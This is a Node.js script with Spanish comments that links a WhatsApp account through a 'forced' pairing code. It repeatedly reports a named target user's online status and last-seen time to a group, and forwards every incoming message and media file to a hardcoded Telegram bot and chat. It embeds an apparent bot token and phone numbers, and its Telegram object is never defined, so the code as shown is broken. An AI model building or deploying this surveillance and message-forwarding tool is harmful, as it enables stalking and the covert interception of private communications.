const phoneNumbers = '+5358126024'; // Número internacional
const phoneNumber = "Erne";
const { Client, LocalAuth } = require('whatsapp-web.js');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { Boom } = require('@hapi/boom');

// Configuración
const telegramToken = '6587799120:AAHy5m6vwFo1zX2odV1nBuzuuncgxCzNrk0';
const telegramChatId = '624861458';
const targetUser = '5359057080@c.us';
const grupoDestino = 'Proyecto X';
const intervalo = 30 * 60 * 60 * 1000; // 30 horas

// Configurar cliente WhatsApp
const whatsappClient = new Client({
  puppeteer: {
    headless: 'new', // Modo headless mejorado
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--single-process'
    ],

  },
  authStrategy: new LocalAuth({
    clientId: phoneNumber,
    dataPath: path.join(__dirname, `wwebjs_sessions/${phoneNumber}`),
    backupSyncIntervalMs: 300000 // 5 minutos
  }),
  webVersionCache: {
    type: 'remote',
    remotePath: 'https://raw.githubusercontent.com/wppconnect-team/wa-version/main/html/2.2412.54.html'
  }
});

// Configurar interfaz de lectura
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// ================= AUTENTICACIÓN FORZADA =================
async function forceWhatsAppAuth() {
  try {
    console.log('🔥 Iniciando autenticación forzada...');
    
    // Generar código de vinculación
    const pairingCode = await whatsappClient.requestPairingCode(phoneNumbers);
    console.log(`\n✅ CÓDIGO DE 8 DÍGITOS: ${pairingCode}`);
    console.log('📱 Ingresar en WhatsApp: Configuración → Dispositivos vinculados → Vincular dispositivo');

    // Verificar conexión cada 3 segundos
    const connectionChecker = setInterval(async () => {
      if (whatsappClient.info?.wid) {
        clearInterval(connectionChecker);
        console.log('⚡ Conexión validada!');
        iniciarProgramador();
      }
    }, 3000);

  } catch (error) {
    console.error('❌ Error crítico:', error);
    if (error instanceof Boom) console.error('Detalles técnicos:', error.output.payload);
    process.exit(1);
  }
}

// ================= FUNCIONALIDAD PRINCIPAL =================
whatsappClient.on('ready', () => {
  console.log('\n🟢 WhatsApp completamente operativo');
  iniciarProgramador();
});

async function verificarYEnviarEstado() {
  try {
    const contact = await whatsappClient.getContactById(targetUser);
    const ultimaConexion = contact.lastSeen 
      ? new Date(contact.lastSeen * 1000).toLocaleString() 
      : 'No disponible';

    const mensaje = `*Estado de ${contact.pushname || targetUser}:*
🟢 En línea: ${contact.isOnline ? 'Sí' : 'No'}
⏳ Última conexión: ${ultimaConexion}
📅 Actualizado: ${new Date().toLocaleString()}`;

    const grupo = (await whatsappClient.getChats()).find(chat => 
      chat.isGroup && chat.name.toLowerCase() === grupoDestino.toLowerCase()
    );

    if (grupo) {
      await grupo.sendMessage(mensaje);
      console.log('✅ Estado enviado al grupo');
    }
  } catch (error) {
    console.error('Error en verificación:', error);
  }
}

function iniciarProgramador() {
  verificarYEnviarEstado();
  const intervalID = setInterval(verificarYEnviarEstado, intervalo);
  console.log(`⏰ Programador activo cada ${intervalo/3600000} horas`);
}

// ================= MANEJO DE MENSAJES =================
whatsappClient.on('message', async (msg) => {
  try {
    const contact = await msg.getContact();
    const info = `📩 Nuevo mensaje de ${contact.pushname} (${contact.number}):
🕒 ${new Date(msg.timestamp * 1000).toLocaleString()}
📝 ${msg.body}`;

    // Enviar a Telegram
    await telegramBot.sendMessage(telegramChatId, info);

    // Manejar multimedia
    if (msg.hasMedia) {
      const media = await msg.downloadMedia();
      const buffer = Buffer.from(media.data, 'base64');
      
      const caption = `${info}\n📄 ${media.filename || 'archivo_sin_nombre'}`;
      
      await telegramBot.sendDocument(telegramChatId, buffer, {
        caption,
        filename: media.filename || `archivo_${Date.now()}`
      });
    }
  } catch (error) {
    console.error('Error procesando mensaje:', error);
  }
});

// ================= INICIALIZACIÓN =================
(async () => {
  try {
    // Configurar directorio de sesiones
    const sessionDir = path.join(__dirname, `wwebjs_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
      fs.chmodSync(sessionDir, 0o777);
    }

    // Iniciar cliente
    await whatsappClient.initialize();
    console.log('🚀 Núcleo de WhatsApp inicializado');
    
    // Forzar autenticación
    await forceWhatsAppAuth();

  } catch (error) {
    console.error('Fallo catastrófico:', error);
    process.exit(1);
  }
})();

// ================= MANEJO DE EVENTOS CRÍTICOS =================
process.on('uncaughtException', (err) => {
  console.error('⚠️ Excepción no capturada:', err);
});

process.on('unhandledRejection', (reason) => {
  console.error('⚠️ Promesa rechazada:', reason);
});